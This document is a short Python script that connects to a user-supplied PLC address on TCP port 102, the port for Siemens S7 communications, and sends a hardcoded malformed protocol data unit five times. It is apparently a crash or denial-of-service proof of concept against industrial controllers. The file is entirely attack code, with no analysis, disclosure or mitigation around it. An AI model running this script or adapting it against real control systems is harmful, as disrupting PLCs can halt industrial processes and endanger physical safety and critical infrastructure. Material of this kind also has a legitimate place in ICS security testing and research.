import socket
from optparse import OptionParser

parser = OptionParser()
parser.add_option("-a", "--plc_ip_addr", dest="plc_ip", help="Specify PLC IP address")
(options, args) = parser.parse_args()

if options.plc_ip:
    print("PLC IP Address:", options.plc_ip)
else:
    print("ERROR: PLC IP Address not specified.")
    exit()

# Define the target PLC IP address and port
plc_port = 102

# Craft a malformed PDU with the desired payload
malformed_pdu = b'\x03\x00\x00\x18\x02\xf0\x80\x32\x01\x00\x00\x00\x00\x00\x08\x00\x00\xf0\x00\x00\x01\x00\x01\x01\xe0'

# Create a socket and send the malformed PDU
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((options.plc_ip, plc_port))

for i in range(0, 5):
    sock.send(malformed_pdu)

print(f"Sent multiple malformed messages to {options.plc_ip}")

sock.close()
